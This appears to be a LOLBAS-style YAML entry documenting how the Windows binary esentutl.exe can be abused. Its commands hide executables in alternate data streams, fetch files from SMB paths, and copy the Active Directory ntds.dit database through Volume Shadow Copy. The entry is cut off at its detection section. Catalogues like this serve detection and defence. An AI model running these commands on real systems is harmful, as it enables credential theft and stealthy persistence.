      document_utf8: "---\nName: Esentutl.exe\nDescription: Binary for working with Microsoft Joint Engine\
        \ Technology (JET) database\nAuthor: Oddvar Moe\nCreated: 2018-05-25\nCommands:\n  - Command:\
        \ esentutl.exe /y {PATH_ABSOLUTE:.source.vbs} /d {PATH_ABSOLUTE:.dest.vbs} /o\n    Description:\
        \ Copies the source VBS file to the destination VBS file.\n    Usecase: Copies files from A to\
        \ B\n    Category: Copy\n    Privileges: User\n    MitreID: T1105\n    OperatingSystem: Windows\
        \ vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n  - Command: esentutl.exe\
        \ /y {PATH_ABSOLUTE:.exe} /d {PATH_ABSOLUTE}:file.exe /o\n    Description: Copies the source EXE\
        \ to an Alternate Data Stream (ADS) of the destination file.\n    Usecase: Copy file and hide\
        \ it in an alternate data stream as a defensive counter measure\n    Category: ADS\n    Privileges:\
        \ User\n    MitreID: T1564.004\n    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows\
        \ 8.1, Windows 10, Windows 11\n  - Command: esentutl.exe /y {PATH_ABSOLUTE}:file.exe /d {PATH_ABSOLUTE:.exe}\
        \ /o\n    Description: Copies the source Alternate Data Stream (ADS) to the destination EXE.\n\
        \    Usecase: Extract hidden file within alternate data streams\n    Category: ADS\n    Privileges:\
        \ User\n    MitreID: T1564.004\n    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows\
        \ 8.1, Windows 10, Windows 11\n  - Command: esentutl.exe /y {PATH_SMB:.exe} /d {PATH_ABSOLUTE}:file.exe\
        \ /o\n    Description: Copies the remote source EXE to the destination Alternate Data Stream (ADS)\
        \ of the destination file.\n    Usecase: Copy file and hide it in an alternate data stream as\
        \ a defensive counter measure\n    Category: ADS\n    Privileges: User\n    MitreID: T1564.004\n\
        \    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n\
        \  - Command: esentutl.exe /y {PATH_SMB:.source.exe} /d {PATH_SMB:.dest.exe} /o\n    Description:\
        \ Copies the source EXE to the destination EXE file\n    Usecase: Use to copy files from one unc\
        \ path to another\n    Category: Download\n    Privileges: User\n    MitreID: T1564.004\n    OperatingSystem:\
        \ Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n  - Command: esentutl.exe\
        \ /y /vss c:\\windows\\ntds\\ntds.dit /d {PATH_ABSOLUTE:.dit}\n    Description: Copies a (locked)\
        \ file using Volume Shadow Copy\n    Usecase: Copy/extract a locked file such as the AD Database\n\
        \    Category: Copy\n    Privileges: Admin\n    MitreID: T1003.003\n    OperatingSystem: Windows\
        \ 10, Windows 11, Windows 2016 Server, Windows 2019 Server\nFull_Path:\n  - Path: C:\\Windows\\\
        System32\\esentutl.exe\n  - Path: C:\\Windows\\SysWOW64\\esentutl.exe\nDetection:\n  - Sigma:\
